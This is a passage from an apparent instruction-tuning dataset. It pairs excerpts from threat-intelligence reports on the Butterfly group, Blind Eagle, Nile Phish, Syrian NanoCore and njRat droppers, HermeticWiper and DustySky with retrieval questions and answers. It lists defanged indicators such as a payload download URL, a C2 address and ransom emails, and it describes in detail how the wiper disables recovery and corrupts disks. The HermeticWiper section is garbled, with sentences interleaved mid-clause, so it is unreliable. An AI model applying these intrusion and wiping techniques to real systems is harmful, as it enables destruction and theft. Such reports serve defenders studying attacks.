likely occur immediately after a breach because the group maximizes their potential by realizing profit and redirecting their resources to the next target. Few concurrent campaigns were observed. Once information is sold to a third party, attribution of the attack becomes more difficult. The realized impact of lost financial data or stolen intellectual property could cripple the organization.\nThe Butterfly group has targeted pharmaceutical companies, technology firms, law practices, oil and precious metal mining organizations, Twitter, Facebook, Apple, and Microsoft. Since their creation in 2012, the group has compromised at least 49 organizations. There was only one government victim and they may have been collateral damage of a different campaign. Butterfly does not appear interested in nation state intelligence. After the attacks against Twitter, Facebook, Apple, and Microsoft in February 2013 drew the attention of security researchers, the group went dormant. They reemerged in August 2013 and have been gradually increasing their number of attacks per year. Of the 49 companies targeted, 17 are based in the United States, 12 are based in Europe, and 4 are based in Canada. The remaining 16 victims are located in Brazil, China, Hong Kong, India, Israel, Japan,\nKazakhstan, Malaysia, Morocco, Nigeria, Taiwan, Thailand, South Korea, and the United Arab Emirates.\nIn attacks against pharmaceutical companies, the attackers breached small regional offices and then slowly moved across the network to the main network. In late 2014, two natural resource organizations that specialize in gold and oil were compromised. In June 2015, a Central Asian global law firm was compromised and financial information and information about regional natural resources may have been targeted. This has led to speculation that the attackers may be focusing on information that is valuable in the commodities market. The behavior may also indicate direction from a third party client who is invested in the commodities market.\nAttacks seem to be focused on specific systems that are of interest to the attackers, such as Microsoft Exchange or Lotus Domino email servers. The attackers may want to monitor emails or they may want to inject messages into the server. Content management servers, which index and store documents and digital assets, were also targeted. According to Symantec, these servers likely contained legal documents, internal policies, training documents, product descriptions, and financial records. The actor may gauge the value of a target based on training materials and presentations for related technologies under development at the organization. In at least one instance, the group hacked a Physical Security Information Management (PSIM) system which collects, processes, and stores data from physical security devices such as CCTV, magnetic card systems, HVAC, and building security systems. The actor could have been monitoring employees throughout their daily activities, or the system could have been compromised by mistake.\nThe Butterfly group exploits zero-day vulnerabilities from a water hole website. In February 2013 Twitter, Facebook, Apple, and Microsoft were attacked within a three-week period. The Butterfly group initiated their campaign with a Java zero-day exploit that was delivered from a popular iPhone mobile development website. For some of the attacks, F- Secure believes that the payload delivered after the breach may have been a Mac OS X backdoor, dubbed OSX Pintsized. Attacks against Windows systems likely featured the Jripbot backdoor. Symantec believes that the group may also exploit Internet Explorer 10 or an Internet Explorer plugin. At least one recent attack suggests that the group might also conduct SQL injection attacks.\nAfter a network is compromised, the group carefully adapts to the environment and utilizes remote access tools and management systems to laterally move across the network. The adversaries have used native Citrix systems and the TeamViewer applications to move across some networks. The attackers are able to rapidly assess whether a system is valuable or whether they should move to a new system on the network. The Butterfly group uses a\nunique set of tools, which seem to have been developed by or developed for the attackers. Symantec could not find any open source data on the tools. The tools all contain use documentation. One tool, bj.dat, (called \"Banner Jack.\" ) is used to locate vulnerable network servers, printers, routers, HTTP servers, or TCP servers. Banner Jack retrieves default messages from Telnet, HTTP, and TCP servers. Banner Jack accepts an input IP range and port and then it connects each IP address to a port. Then it retrieves and logs any data printed by the server. The Proxy.A tool creates a proxy connection so that the actor can route traffic through a proxy node to a destination node. The Eventlog tool parses event logs, dumps interesting logs and deletes incriminating logs. The tool can also end processes and delete itself. The Multipurpose tool edits event logs, dumps passwords, securely deletes files, encrypts files, enumerates the network, and assists the attacker in moving across the network.\nThe Butterfly group exhibits intense operational security. Many of their tools self-delete, and others are securely deleted by a GNU Shred tool used by the attackers. Event logs are modified or deleted to hide the intrusion. Uninteresting computers are fully purged of all traces of the attacker's presence. C&C domains are registered with disposable names and emails. Hosts of C&C servers are paid using the Bitcoin anonymous digital currency. Symantec observed that the group \"uses encrypted virtual machines and multi-staged C&C servers\" to make it more difficult to investigate their middle infrastructure. Symantec managed to track activity through proxies to a C&C server that was digitally sterilized. No activity was logged and the system featured Truecrypt and a Virtual Box virtual machine. Compromised systems were likely attacked from within the virtual machine; consequently, analysis is difficult when the image is not live.\n\nQ: What types of organizations and industries does the Butterfly group target, and what kind of information are they typically after? Why might these targets be particularly valuable to the group?",
    "output": "A: The Butterfly group targets a variety of organizations and industries, including pharmaceutical companies, technology firms, law practices, oil and precious metal mining organizations, and major tech companies like Twitter, Facebook, Apple, and Microsoft. They are typically after financial information, intellectual property, and other valuable data. These targets are particularly valuable because the stolen information can be sold for fiscal gain, often to third parties who might be interested in commodities markets or competitive intelligence. The group's focus on specific systems like email servers and content management servers indicates a strategic approach to data exfiltration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS\nFor the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above \u2014 phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.\nSuch emails usually feature either a malicious document or a malicious link, but in this case, the attackers said \"why not both?\" and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.\nIn both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different \"server\" depending on the original country ( https://gtly[.]to/QvlFV_zgh ). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.\nIf the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the (<https://en.wikipedia.org/wiki/LHA_(file_format)>)LHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.\nThe malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.\nQuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and always (<https://research.checkpoint.com/2020/gozi-the-malware-with-a-thousand-faces/>)makes us heave a sad sigh when we encounter it.\nAlthough QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample's embedded strings that the group's main goal in the campaign was to intercept victim access to their bank account.\nThis is a complete list of targeted entities:\nBancolombia Sucursal Virtual Personas\nSucursal_Virtual_Empresas_\nPortal Empresarial Davivienda\nBBVA Net Cash\nColpatria \u2013 Banca Empresas\nbancaempresas.bancocajasocial.com\nEmpresarial Banco de Bogota\nconexionenlinea.bancodebogota.com\nAV Villas \u2013 Banca Empresarial\nBancoomeva Banca Empresarial\nTRANSUNION\nBanco Popular\nportalpymes\nBlockchain\nDashboardDavivienda\nSome extra features added to Quasar by this group are a function named \"ActivarRDP\" (activate RDP) and two more to activate and deactivate the system Proxy:\nAlong with a few more commands that incur technical debt by impudently disregarding Quasar's convention for function name and parameter order:\n\nWhat modifications did Blind Eagle make to the QuasarRAT, and how do these modifications indicate the group's objectives and tactics?",
    "output": "Blind Eagle made several modifications to the QuasarRAT, including adding a function named 'ActivarRDP' (activate RDP) and two more functions to activate and deactivate the system Proxy. Additionally, they added a few more commands that disregard Quasar's convention for function name and parameter order. These modifications indicate that the group aims to gain remote desktop access and control network traffic, possibly to facilitate further exploitation or data exfiltration. The presence of Spanish-language function and variable names suggests that the actors behind this APT group are likely Spanish-speaking. Furthermore, the embedded strings in the sample reveal that the group's main goal in the campaign was to intercept victim access to their bank accounts, highlighting their financial motivation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: By: John Scott-Railton*, Ramy Raoof***, Bill Marczak*, and Etienne Maynier**\n*Senior Researcher, Citizen Lab, ***Senior Research Technologist, Egyptian Initiative for Personal Rights, **Mozilla Open Web Fellow, Citizen Lab\nMedia coverage: (<https://apnews.com/64ca55d26df3484da09172281b9c8e86/Embattled-Egyptian-NGOs-face-barrage-of-electronic-espionage>)Associated Press, (<https://motherboard.vice.com/en_us/article/egyptian-human-rights-activists-are-being-targeted-in-dangerous-hacking-campaign>)Vice, (<https://theintercept.com/2017/02/02/egyptian-rights-activists-are-targeted-by-sophisticated-hacking-attacks/>)The Intercept, (<http://thehill.com/policy/cybersecurity/317528-egyptian-ngos-targeted-in-phishing-campaign>)The Hill, (<http://egyptianstreets.com/2017/02/02/systemised-hacking-campaign-breaking-into-egypts-civil-society/>)Egyptian Streets, (<http://www.lastampa.it/2017/02/02/esteri/scoperta-una-campagna-per-spiare-le-mail-di-attivisti-egiziani-inclusi-i-consulenti-di-regeni-BuqfqBEJqlhQSRHflfSl1K/pagina.html>)La Stampa, (<http://www.slate.com/blogs/future_tense/2017/02/03/netizen_report_egyptian_ngos_face_rampant_phishing_attacks_researchers_say.html>)Slate, (<http://www.cairoportal.com/story/588315/%D9%85%D8%B1%D9%83%D8%B2-%D8%AA%D9%83%D9%86%D9%88%D9%84%D9%88%D8%AC%D9%8A-%D9%83%D9%86%D8%AF%D9%8A-%D9%8A%D9%83%D8%B4%D9%81-%D8%AA%D9%88%D8%B1%D8%B7-%D8%A7%D9%84%D8%AD%D9%83%D9%88%D9%85%D8%A9-%D8%A7%D9%84%D9%85%D8%B5%D8%B1%D9%8A%D8%A9-%D9%81%D9%8A-%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82-%D8%AD%D8%B3%D8%A7%D8%A8%D8%A7%D8%AA-%D9%85%D9%86%D8%B8%D9%85%D8%A7%D8%AA-%D9%88%D9%86%D8%B4%D8%B7%D8%A7%D8%A1-%D8%B9%D9%84%D9%89-%D9%85%D9%88%D8%A7%D9%82%D8%B9-%D8%A7%D9%84%D8%AA%D9%88%D8%A7%D8%B5%D9%84>)Cairo Portal, (<https://www.version2.dk/artikel/phishingmetoder-brugt-mod-egyptiske-menneskerettighedsorganisationer-1072947>)Version2, (<http://m.alnabaa.net/628804>)Al Nabaa, (<https://www.middleeastmonitor.com/20170202-egypt-is-using-cyber-attacks-to-target-ngos/>)Middle East Monitor, (<https://almesryoon.com/%D8%A7%D9%84%D8%B3%D9%8A%D8%A7%D8%B3%D9%8A%D8%A9/1022833-92-%D9%87%D8%AC%D9%85%D8%A9-%D8%A7%D9%84%D9%83%D8%AA%D8%B1%D9%88%D9%86%D9%8A%D8%A9-%D8%AA%D8%B3%D8%AA%D9%87%D8%AF%D9%81-%D9%85%D9%86%D8%B8%D9%85%D8%A7%D8%AA-%D8%AD%D9%82%D9%88%D9%82%D9%8A%D8%A9>)Al Mesryoon, (<https://netzpolitik.org/2017/aegypten-ausgefeilte-hacking-angriffe-auf-menschenrechtler/>)Netzpolitik (in German).\nBig Headline: Key Findings\nEgyptian NGOs are currently being targeted by Nile Phish, a large-scale phishing campaign.\nAlmost all of the targets we identified are also implicated in Case 173, a sprawling legal case brought by the Egyptian government against NGOs, at ich has been referred to as an \"unprecedented crackdown\" on Egypt's civil society.\nNile Phish operators demonstrate an intimate knowledge of Egyptian NGOs, and are able to roll out phishing attacks within hours of government actions, such as arrests.\nBig Headline: Summary\nThis report describes Nile Phish, an ongoing and extensive phishing campaign against Egyptian civil society. In recent years, Egypt has witnessed what is widely described as an \"(<http://www.france24.com/en/20170113-egypt-crackdown-civil-society-ngo-amnesty-sisi>)unprecedented crackdown,\" on both civil society and dissent. Amidst this backdrop, in late November 2016 Citizen Lab began investigating phishing attempts on staff at the (<http://eipr.org/en>)Egyptian Initiative for Personal Rights (EIPR), an Egyptian organization working on research, advocacy and legal engagement to support basic freedoms and rights.\nWith the collaboration and assistance of EIPR, our investigation expanded to include seven Egyptian NGOs targeted by Nile Phish. These seven organizations work on a variety of human rights issues, including political freedoms, gender issues, and freedom of speech. We also identified individual targets, including Egyptian lawyers, journalists, and independent activists.\nWith only a handful of exceptions, Nile Phish targets are implicated in (<http://eipr.org/en/press/2016/03/background-case-no-173-%E2%80%9Cforeign-funding-case%E2%80%9D>)Case 173, a legal case brought against NGOs by the Egyptian government over issues of foreign funding. The phishing campaign also coincides with renewed pressure on these organizations and their staff by the Egyptian government, in the context of Case 173, including asset freezes, travel bans, forced closures, and arrests.\nOur collaborative investigation has documented at least 92 messages sent by Nile Phish, many highly personalized, and sent as recently as January 31st, 2017. The phishing campaign has included at least two phases, each with distinct phishing tactics and domains. Efforts seem to have been made to compartmentalize the infrastructure for each phase, but a technical error allowed us to link the servers and conclude that the two phases were part of a single campaign.\nNile Phish's sponsor clearly has a strong interest in the activities of Egyptian NGOs, specifically those charged by the Egyptian government in Case 173. The Nile Phish operator shows intimate familiarity with the targeted NGOs activities, the concerns of their staff, and an ability to quickly phish on the heels of action by the Egyptian government. For example, we observed phishing against the colleagues of prominent Egyptian lawyer Azza Soliman, within hours of her (<https://www.theguardian.com/world/2016/dec/07/womens-rights-activist-azza-soliman-arrested-in-egypt>)arrest in December 2016. The phishing claimed to be a copy of her arrest warrant.\nWe are not in a position in this report to conclusively attribute Nile Phish to a particular sponsor. However, the scale of the campaign and its persistence, within the context of other legal pressures and harassment, compound the extremely difficult situation faced by NGOs in Egypt.\n\nQuestion: How does the Nile Phish campaign demonstrate an intimate knowledge of Egyptian NGOs, and how does this knowledge contribute to the effectiveness of the phishing attacks?\n\nAnswer:",
    "output": "The Nile Phish campaign demonstrates an intimate knowledge of Egyptian NGOs by showing familiarity with the targeted NGOs' activities and the concerns of their staff. This knowledge contributes to the effectiveness of the phishing attacks by allowing the operators to quickly phish on the heels of action by the Egyptian government. For example, phishing attempts were observed against the colleagues of prominent Egyptian lawyer Azza Soliman within hours of her arrest in December 2016. The phishing message claimed to be a copy of her arrest warrant, which shows the operators' ability to leverage timely and relevant information to increase the likelihood of success.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Acknowledgements\nWe thank Noura Al-Ameer for collaborating with this investigation, and for graciously agreeing to be included in this report. The targeted nature of many cases means that, without the help of brave targets and victims, we are often left with a very limited view of what is taking place.\nWe are exceptionally grateful to colleagues at Citizen Lab for comments, critical feedback, and assistance with document preparation including Ron Deibert, Bill Marczak, Morgan Marquis-Boire, Sarah McKune, Masashi Nishihata, Irene Poetranto,Christine Schoellhorn, and Adam Senft.\nThanks also to Justin Kosslyn and Brandon Dixon for helpful feedback.\nWe would also like to thank the following teams: Lookout, PassiveTotal and RiskIQ, VirusTotal, and Cisco's AMP Threat Grid Team for data correlation.\nVery special thanks to other investigators who wished to remain anonymous but provided exceptionally helpful assistance, especially TNG and Tuka.\nMedium Headline: Dropper Doc 1 (From E-mail 1)\nAssadcrimes.ppsx\nMD5: 76F8142B4E52C671871B3DF87F10C30C\nThis slideshow deploys its malicious payload by (ab)using the OLE object embedding capabilities of PowerPoint.Specifically, the malware executable is embedded into the slideshow as an OLE Object of type Package:\nOnce embedded, the slideshow \"Animation\" feature is used to trigger the execution of the object immediately upon viewing the first slide.\nIn one of the malicious PPSX files, we can see the embedded package object by viewing the slides in normal view mode:\nOnce activated, the embedded object is saved to disk as %TEMP%\\putty.exe, and then executed. This executable is a .Net downloader.\nIn Figure 20 we can see that the second stage payload is obtained from the URL http://assadcrimes[.]info/1/dvm.exe [Ref 1]. This second stage executable is saved to disk as %temp%\\dwm.exe [Ref 2], and then executed [Ref 3].\nThe %temp%\\dwm.exe file has the following hashes:\nThe malware downloaded and executed by the .Net downloader is NanoCore, a well-known RAT (Remote Access Trojan) that enables the remote monitoring of victims via their computers. The NanoCore binary is wrapped using several layers of code obfuscation, which we describe in detail below.\nMedium Headline: Unpacking\nThe packer used on this executable employs a simple technique of base64 encoding the PE file and breaking it up into numerous lines which are then embedded into the resource section of the .Net packer stub file. At runtime, the packer reverses this process, then invokes the resulting .Net assembly from memory.\nExtracting this packed code reveals a .Net assembly which is yet another layer of code protection applied using a 'crypter'. This binary has the following hashes:\nMedium Headline: Decrypting\nThis executable is stub code which performs in-memory AES decryption of a base64 encoded string variable. This string variable holds an encrypted copy of the NanoCore RAT binary.\nThis encryption of the underlying malware is typically employed to bypass detection by endpoint security controls such as antivirus programs. Many 'crypter' tools, as they are known, are available for purchase or trade on various hacking forums.\nOf particular note, this decrypting stub code retained its PDB (short for Program Database) information. PDB file references are common in .Net applications when compiled in 'debug' mode, and they frequently reveal the original file path of the application source code on the developer's computer.\nThis executable revealed the following PDB file path:\nc:\\users\\mr.tekide\\documents\\visual studio 2013\\projects\\paccryptnano core dehgani -vds\\windowsapplication2\\obj\\debug\\launch manager.pdb\nThis PDB string indicates that 'mr.tekide' was the username of the developer who compiled this particular stub, and further that it was compiled as part of a Visual Studio project named 'paccryptnano core dehgani -vds'. In addition, a single subroutine found inside the decrypting stub was named 'tekide'. The relevance of this PDB string was discussed above in Part 5: Attribution.\nIn order to obtain the intended malware payload from this decrypting stub executable, we created a small .Net application to mimic the decryption steps and output the file to disk. Once complete, we obtained a malicious executable with hashes:\nMedium Headline: Original NanoCore binary\nNow that we have arrived at the original NanoCore binary, we can examine the configuration as specified by the operator. In order to extract the configuration settings from this copy of NanoCore, we used Kevin Breen's (<https://github.com/kevthehermit/RATDecoders>)RATDecoders.\nUsing Breen's tool we arrived at the following configuration:\nNotably, 88.198.222[.]163 port 8081 is the command and control channel for this malware. As noted in Part 1, the same IP was also present in the seeding e-mail header.\nMedium Headline: Dropper Doc 2\nassadcrimes1.ppsx\nMD5:F1F84EA3229DCA0CCACB7381A2F49F99\nThis PowerPoint document leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system. As described in (<https://citizenlab.org/2015/06/targeted-attacks-against-tibetan-and-hong-kong-groups-exploiting-cve-2014-4114/>)previous reporting, this vulnerability causes a file embedded within the PowerPoint document to be copied to disk and executed silently on vulnerable systems.\nThe document under examination drops a file named dvm.gif to disk, renames it to dvm.exe and then executes it. This dvm.exe is the same packed and crypted copy of NanoCore as retrieved and executed by the .Net downloader described in the previous section.\nMedium Headline: Dropper Doc 3\nassadcrimes.info.ppsx\nMD5: 30BB678DB3AD0140FC33ACD9803385C3\nThis malicious PowerPoint document uses the same weaponization method described above with respect to Dropper Doc 1. The executable is embedded as an OLE package object, and subsequently executed using animation actions within the PowerPoint slideshow.\nAs with Dropper Doc 1, activation of the OLE Package object saves the embedded executable to disk as %TEMP%\\putty.exe, then executes it. This file is a .Net application employing the same layers and methods of packing and crypting as seen in the payloads delivered by Dropper Docs 1 and 2. However, the ultimate malware payload in this case is njRat, another well-known RAT tool.\nAfter unpacking the OLE embedded executable putty.exe, we again arrive at a decrypting stub file which will AES decrypt a base64 string variable and run it from memory. The hashes of this file are:\nSimilar to the case of Dropper Doc 1 above, we find a PDB entry present in the decrypting stub executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio\n2013\\Projects\\paccrypt11njratmalii\\paccryptalipnahzade\\obj\\Debug\\LManager.pdb\nAgain we can observe the same username of 'mr.tekide' in the project source code path within the PDB string. Further, we note the development path components paccrypt11njratmalii and paccryptalipnahzade.\nTo obtain the malicious njRat executable from this decrypting stub we used the same .Net program we built for use in the Dropper Doc 1 example above. The resulting njRat binary had the following hashes:\nInterestingly, the njRat executable appears to have been compiled from source by the same user who compiled the crypter described above. Note the PDB strings found inside the njRat executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\njrat7stubsoures \u2013\nCopy\\njrat7stubsoures\\obj\\Debug\\dvvm.pdb\nA quick look at the configuration data embedded within this njRat binary reveals the command and control IP address and port:\n\nWhat is the purpose of the .Net downloader in the Assadcrimes.ppsx malware, and how does it retrieve and execute the second stage payload?",
    "output": "The purpose of the .Net downloader in the Assadcrimes.ppsx malware is to retrieve and execute the second stage payload. The .Net downloader obtains the second stage payload from the URL http://assadcrimes[.]info/1/dvm.exe. This second stage executable is saved to disk as %temp%\\dwm.exe and then executed. The second stage payload is NanoCore, a well-known Remote Access Trojan (RAT) that enables the remote monitoring of victims via their computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical Analysis\nMultiple infection vectors for the HermeticWiper malware have been .\nThe delivery of the malware to a Ukrainian organization followed a Server Message Block (SMB)-based attack on a Microsoft Exchange server on December 23, 2021. The adversary initially stole credentials, and a web shell was installed on January 16, 2022. HermeticWiper was finally deployed on February 23, 2022.\nA Lithuanian organization that received HermeticWiper was initially compromised in November 2021. The delivery mechanism was suspected by Symantec as being an Apache Tomcat exploit that executed a malicious PowerShell command. This attack similarly included a credential harvesting component, followed quickly by the delivery and execution of the wiper malware as a scheduled task.\nIn several of the attacks, a ransomware executable was delivered alongside HermeticWiper. The victims received a ransomware notification providing 2 email addresses: vote2024forjb@protonmail[.]com and stephanie.jones2024@ protonmail[.]com. Symantec considers it likely that the ransomware component was the victims. WhisperGate attacks used a similar methodology, wherein the attack was disguised as ransomware. Both WhisperGate and HermeticWiper used separate components to prevent a victim's system from booting and file corruption; however, the component that played the role of ransomware changed between the 2 attacks. With WhisperGate, the wiper itself masqueraded as ransomware; however, with the HermeticWiper attacks, it was the file corrupter instead.\nESET reported that in one instance they observed, the malware was dropped via default Group Policy Objects (GPO), indicating that the adversaries almost certainly had control of an Active Directory server on the network.\nHermeticWiper's primary purpose is to corrupt the NTFS and/or FAT file systems of a victim's machine to prevent it from booting correctly. It was written in Visual Studio 2008 and 2015 in a combination of C and assembly and uses an included kernel driver to implement much of its disk access functionality. The use of a kernel driver instead of conventional Windows API calls is to evade detections that may catch the higher-level API calls being made. The compiler timestamps for 2 samples show that they were compiled on December 28, 2021, and 1 other sample shows February 23, 2022. Although timestamps can be forged, the timestamp from December 28, 2021, could be used to determine how far in advance this operation was planned. Each sample is signed using what was, at the time, a valid certificate issued to Hermetica Digital Ltd. Since the malware's discovery, the certificate has since been revoked by the Certificate Authority, as shown in Figure 1 above.\nUpon execution, the wiper adjusts its process token privileges to acquire SeBackupPrivilege and SeShutdownPrivilege in order to obtain read privileges to any files and eventually shut down the system before terminating. Next, it determines the Windows version and bitness (x86 or x86_64) of the victim's machine in order to determine which kernel driver, located in the PE's resource section, to later load. The kernel drivers are legitimate, benign software used by EaseUS's Partition Master and are signed with a certificate issued to EaseUS's parent company, CHENGDU YIWO Tech Development Co., Ltd., shown in Figure 2 below. Although the certificate has expired, newer versions of Windows 10 allow for kernel drivers with certificates issued before July 29, 2015, to be loaded.\nTo create the service, the process's token privileges are adjusted again to add SeLoadDriverPrivilege. A service is then created, configured, and started. Once the driver is successfully loaded, the created service's registry entry is removed from HKLM\\SYSTEM\\CurrentControlSet\\services\\. Next, the Volume Shadow Service (VSS) is stopped and disabled, as shown in Figure 4, to make recovery more difficult.\nThe wiper then begins to iterate through all physical drives on the system one at a time by attempting to access \\\\.\\PhysicalDrive<1-100>. For each drive, junk data is written to seemingly random locations of the disk in order to corrupt it. Additionally, the partitions on each physical disk are enumerated and any identified as FAT or NTFS file systems are corrupted by writing random data to the file system header. Although public reporting has stated that the MBR is \"wiped\", which typically means the MBR is overwritten, in our analysis we have concluded that only the file system is corrupted along with random locations on the disk. The end result similarly results in a loss of the stored data and inability of the victim machine to boot. Appendix A provides the output from a tool, , that captured the SetFilePointerEX and WriteFile API calls used to corrupt the hard drives on the victim's machine. There were no writes to the \"0\" index, where the MBR would reside, however there are writes to the index, 1048576, which is the location of the NTFS file system header. The additional writes are to seemingly random locations on disk.\nThe corruption of the file systems goes beyond a simple MBR overwrite and is more effective because it impacts a (i.e., MBR, GPT). This technique is more robust than the MBR overwrite used in the WhisperGate attacks, where (<https://www.recordedfuture.com/whispergate-malware-corrupts-computers-ukraine/>)we showed that GPT-style disks could recover from the MBR overwrite.\nThe kernel drivers are stored as RCDATA in the PE file's victim's ability to boot regardless of the disk partitioning scheme resource section, as shown in Figure 3 below. Each driver is compressed using Microsoft's , based on the Lempel\u2013Ziv\u2013Storer\u2013Szymanski (LZSS) .\nAfter corrupting the file system the wiper disables the ShowCompColor and ShowInfoTip values in the Software\\ Microsoft\\CurrentVersion\\Explorer\\Advanced registry key in order to prevent encrypted NTFS files from showing in color and showing pop-up descriptions for folders, respectively. Then\nAfter locating the correct driver, the wiper then proceeds to disable if the victim is running a 64-bit OS. This prevents 64-bit systems from loading 32-bit kernel drivers from the %windir%\\SysWOW64\\drivers directory and instead forces them to use %windir%\\system32\\drivers, where the malware will eventually place the kernel driver. it proceeds to corrupt logs and data on NTFS file systems.\nNext, Crash Dumps are disabled by modifying the registry Finally, the wiper attempts to shut the system down with a value \"CrashDumpEnabled\" to 0 for the key HKLM\\SYSTEM\\ call to InitiateSystemShutdownExW. Once the victim machine is CurrentControlSet\\Control\\CrashControl. This is likely done to rebooted, the user is presented with an error message indicating avoid writing a crash dump to disk when the program terminates. that their system cannot boot. In the case of MBR-style disks,\nThe compressed driver resource is then written to the the victim is presented with a message similar to the one shown %windir%\\system32\\drivers directory with a name consisting of in Figure 5; or in the case of GPT-style disks, the one shown 2 pseudorandom lowercase characters followed by \"dr\". Then in Figure 6. In both cases, although the MBR is still intact, the driver is decompressed, and a service with the same name the system is unable to boot due to the corrupted file system is temporarily created to load the driver. partition containing the Operating System.\nMedium Headline: PartyTicket\nInsikt Group analyzed the ransomware associated with the HermeticWiper malware, dubbed PartyTicket. The ransomware contained several path strings and function names that allude to the White House, Joe Biden, and elections, among other topics, seen below in Figures 7 and 8.\nFigure 8: Ransomware function names (Source: Recorded Future)\nSimilarly, the ransom note dropped by the malware contained email addresses on similar topics, and the encrypted files were renamed with the suffix \"[vote2024forjb@protonmail[.]com]. encryptedJB\", as shown in Figure 10.\nFigure 10 below shows the ransomware note dropped by PartyTicket. While Insikt Group cannot currently attribute the ransomware to any specific group, the note differs substantially from that of other ransomware groups we have seen.\nThere is no \"branding\" identifying a particular ransomware group responsible for the attack, and there are several misspellings and grammatical errors throughout the note. As a result, the ransomware component of the HermeticWiper malware is unlikely to have been developed and distributed by a criminal ransomware group. Further, the malware contains a list of files, shown in Figure 12 below, that it seeks to encrypt. Unlike all other recent, criminal-operated ransomware variants, this list includes files that are key to the ability of the victim system to operate, including .dll and .exe files. This further suggests that this is not legitimate ransomware but rather a destructive piece of malware.\n-inf .acl, .avi .bat .bmp .cab .cfg .chm .cmd .com .crt .css .dat .dip .dll .doc .dot .exe .gif .htm .ico .iso .jpg .mp3 .msi .odt .one .ova .pdf .png .ppt .pub .rar .rtf .sfx .sql .txt .url .vdi .vsd .wma .wmv .wtv .xls .xml .xps .zip\nFigure 11: File extensions the \"ransomware\" seeks to encrypt (Source: Recorded Future)\n\nAnswer this question based on the above context: What is the significance of the compiler timestamps found in the HermeticWiper samples, and how can they provide insights into the planning of the operation?",
    "output": "The compiler timestamps found in the HermeticWiper samples indicate when the malware was compiled. Two samples were compiled on December 28, 2021, and another on February 23, 2022. Although timestamps can be forged, the December 28, 2021, timestamp suggests that the operation was planned well in advance. This information can provide insights into the adversaries' preparation and coordination efforts, indicating a potentially sophisticated and well-resourced threat actor.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: SSL and digital certificates\nRecently, command and control communication changed from HTTP to HTTPS. The digital certificate used in the HTTPS traffic is either self-signed or uses a legitimate Comodo issued certificate.\nThe domain bulk-smtp[.]xyz, which is owned by the attackers, uses the following digital certificate:\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number:\n35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19\nSignature Algorithm: sha256WithRSAEncryption\nPrior to using the Comodo issued certificate, the attackers used a self-signed certificate, impersonating a Tel-Aviv, Israel based company called EMS. The organizational unity in the certificate is \"Email Markting Sales\" (note the misspelling of \"marketing\").\nCertificate:\nData:\nVersion: 3 (0x2)\nSerial Number: 13229300438499639338 (0xb797eaa82fb0c02a)\nSignature Algorithm: sha256WithRSAEncryption\nIssuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml Validity Not Before: Nov 17 14:15:08 2015 GMT Not After : Nov 16 14:15:08 2016 GMT\nSubject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email\nMarkting Sales, CN=email-market.ml/emailAddress=info@email-market.ml\nFor another domain, smtp.gq, this self-signed certificate was used:\nCertificate:\nData:\nVersion: 1 (0x0)\nSerial Number: 12074485766838107425 (0xa79130d4e1e53d21)\nSignature Algorithm: sha1WithRSAEncryption\nIssuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq /emailAddress=info@smtp.gq\nValidity\nNot Before: Nov 17 14:48:51 2015 GMT\nNot After : Dec 17 14:48:51 2015 GMT\nSubject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,\nCN=smtp.gq /emailAddress=info@smtp.gq\nDustySky communication uses some or all of the following paths when communicating with its command and control server:\nUpdate.php\nconn.php\ngeoiploc.php\nnews.htm\npass.php\npassho.php\npassyah.php\nMedium Headline: Infrastructure\nUsing PassiveTotal's attack analysis platform, we were able to visualize the last 6 months of data for key infrastructure used by the actors. It's worth noting that all IP addresses have been active in the past several weeks with many of the domains resolving to them being a combination (green squares) of dynamic DNS providers (blue squares) and registered domains (brown squares). These heatmaps allow us to identify interesting periods or changes in the infrastructure that may have been due to actors adjusting their tactics.\nReader:\nIn this graph, we can see the actors used a combination of dynamic DNS and registered domains up until December 23rd. On that day, the actors seem to remove the registered domain and strictly use dynamic DNS. It's unclear why this would occur, but it's possible that the server changed functions in the attack or was no longer needed.\nMedium Headline: 192.52.167.235\nIn this graph, the colors clearly segment activity that occurred. The primary period of interest appears to be when both dynamic DNS and registered domains are in use. This occurs from September 23rd to December 17th and has a number of days where new domains are associated to the IP address. While not entirely known, this period could reflect the actors going live in their operation. Based on emails sent and compilation dates, there were plenty of phishing campaigns going on during this period of time. 